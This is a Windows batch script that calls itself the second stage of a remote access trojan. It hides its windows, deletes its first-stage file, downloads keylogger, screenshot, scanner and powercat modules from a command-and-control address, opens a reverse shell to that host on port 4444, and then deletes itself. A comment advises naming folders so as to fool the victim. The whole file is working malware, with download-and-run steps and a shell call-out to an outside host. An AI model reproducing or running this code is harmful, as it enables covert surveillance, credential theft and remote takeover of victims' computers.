@REM second stage of RAT
@REM created by : Moussa

@REM variables
set "PATH_PHASE1=%1"
set "INITIAL_PATH=%cd%"
set "FILE_NAME=phase2.cmd"
set "MODULES_PATH=http://10.0.0.212/modules"
set "TEMP_PATH=C:\Users\%username%\AppData\Local\Temp"
set "modulesName=scanner.ps1 screenshot.ps1 keylogger.ps1 powercat.ps1"

@REM Remove phase1
del %PATH_PHASE1%

@REM create folders to store our modules (it is ideal to give a random directory name to fool the victim)
cd %TEMP_PATH%
mkdir modules
cd modules

@REM download modules from our local web server
(for %%m in (%modulesName%) do (
   powershell -WindowStyle Hidden -c "Invoke-WebRequest -Uri %MODULES_PATH%/%%m -Outfile %%m"
))

@REM create a reverse shell connection back to our command and control center (powershell received from powercat module on github)
powershell -WindowsStyle Hidden -c ".\powercat.ps1 -c 10.0.0.212 -p 4444 -e cmd"

@REM remove stage2 file
del "%INITIAL_PATH%\%FILE_NAME%"
